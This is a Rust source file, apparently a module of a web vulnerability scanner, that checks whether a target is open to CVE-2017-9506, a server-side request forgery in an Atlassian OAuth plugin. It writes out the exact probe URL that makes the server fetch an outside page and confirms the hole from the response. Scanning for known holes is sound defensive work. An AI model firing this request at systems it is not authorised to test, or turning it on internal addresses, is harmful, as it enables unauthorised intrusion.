use super::{HttpFinding, HttpModule};
use crate::{modules::Module, Result};
use async_trait::async_trait;
use reqwest::Client;
use tracing::info;

// region:        --- Module info

pub struct Cve2017_9506 {}

impl Cve2017_9506 {
    pub fn new() -> Self {
        Self {}
    }
}

impl Module for Cve2017_9506 {
    fn name(&self) -> String {
        "http/cve_2017_9506".to_string()
    }
    fn description(&self) -> String {
        "Check for CVE-2017-9506 (SSRF)".to_string()
    }
}

// endregion:     --- Module info

#[async_trait]
impl HttpModule for Cve2017_9506 {
    async fn scan(&self, http_client: &Client, endpoint: &str) -> Result<Option<HttpFinding>> {
        let url = format!(
            "{}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com/robots.txt",
            &endpoint
        );
        info!("{:12} - {:?}", "HTTP REQUEST", &url);
        let res = http_client.get(&url).send().await?;

        if !res.status().is_success() {
            return Ok(None);
        }

        let body = res.text().await?;
        if body.contains("user-agent: *") && body.contains("disallow") {
            return Ok(Some(HttpFinding::Cve2017_9506(url)));
        }

        Ok(None)
    }
}